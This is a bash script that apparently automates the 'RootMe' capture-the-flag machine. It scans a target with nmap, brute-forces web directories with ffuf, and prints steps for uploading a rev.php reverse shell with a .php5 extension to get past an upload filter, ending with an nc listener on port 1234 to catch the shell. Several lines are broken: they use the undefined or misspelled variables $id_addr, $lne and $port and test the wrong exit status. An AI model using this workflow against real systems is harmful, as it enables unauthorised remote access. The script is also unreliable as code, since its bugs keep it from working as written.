#!/bin/bash

echo "ROOTME MACHINE EXPLOITED"

read -p "Enter IP: " ip_addr

nmap $ip_addr -sV -T4 -o nmapScan

cat nmapScan | grep -oP '\d+(?=/tcp)' >> open_ports.txt
cat nmapScan | grep -oP '\d+(?=/tcp)' | grep -E '^(80|443|8080|8000|8443)$' > http_ports.txt

while read -r line; do

    echo "THE HTTP PORT/S ARE: " $line
    echo "---------------------------------------------------------------------------"
    echo "CURL http://$id_addr:$line ADDRESS"
    echo "---------------------------------------------------------------------------"

    curl -s -o /dev/null -w "%{http_code}" http://$ip_addr:$lne
    echo "---------------------------------------------------------------------------"

    if [ $? -eq 0 ]; then
        echo "Running ffuf on port $port..."
        
        # Run ffuf for directory brute-forcing
        ffuf -u http://$ip_addr:$port/FUZZ -w /usr/share/wordlists/dirb/common.txt >> ffuf_$port.txt
	cat ffuf_$port.txt
        
        echo "Finished ffuf scan for port $port, results saved to ffuf_$port.txt"
    else
        echo "Failed to fetch data from port $port"
    fi

done < http_ports.txt
rm open_ports.txt http_ports.txt ffuf_$port.txt
echo "================================================================================================="
echo "NAVIGATE TO http://$ip_addr:$line/panel"
echo "================================================================================================="
echo "CHANGE THE IP ADDRESS IN THE rev.php FILE AND UPLOAD IT WITH .php5 EXTENTION"
echo "================================================================================================="
echo "NAVIGATE TO http://$ip_addr:$line/uploads and click the rev.php5"
echo "================================================================================================="

nc -lvnp 1234
